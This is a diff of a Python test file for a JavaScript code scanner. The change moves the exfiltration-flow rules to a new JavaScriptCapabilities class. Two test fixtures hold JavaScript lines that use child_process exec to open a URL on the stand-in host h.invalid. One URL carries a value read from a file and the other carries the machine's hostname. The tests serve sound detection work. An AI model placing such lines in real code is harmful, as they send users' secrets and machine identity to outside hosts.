@@ -12,6 +12,7 @@ from typing import ClassVar
 import pytest
 
 from cordon_scanner.analysis.javascript.js_flow import JsFlow, _Analysis
+from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities
 
 
 class FlowKit:
@@ -556,7 +557,6 @@ class TestOpeners:
         assert (["network_response"], "process") in [f[:2] for f in flows]
 
     def test_a_secret_in_the_link_is_still_sent(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         text = (
             'const { exec } = require("child_process"); const fs = require("fs");\n'
@@ -564,19 +564,18 @@ class TestOpeners:
             'exec(`open "https://h.invalid/?k=${k}"`);\n'
         )
         assert (["home_file", "secret_file"], "open", "unknown") in FlowKit.flows(text)
-        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
+        sinks = {rule: s for _, rule, s in JavaScriptCapabilities.JS_FLOW_RULES}
         assert "open" in sinks["CAP.JS.FLOW.SECRET_FILE_SENT"]
         assert "open" not in sinks["CAP.JS.FLOW.REMOTE_CODE"]
 
     def test_the_host_name_in_the_link_is_still_sent(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
         text = (
             'const { exec } = require("child_process"); const os = require("os");\n'
             'exec(`open "https://h.invalid/?h=${os.hostname()}"`);\n'
         )
         assert (["identity"], "open", "unknown") in FlowKit.flows(text)
-        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
+        sinks = {rule: s for _, rule, s in JavaScriptCapabilities.JS_FLOW_RULES}
         assert "open" in sinks["CAP.JS.FLOW.IDENTITY_SENT"]
         assert "open" in sinks["CAP.JS.FLOW.ENVIRONMENT_SENT"]
 
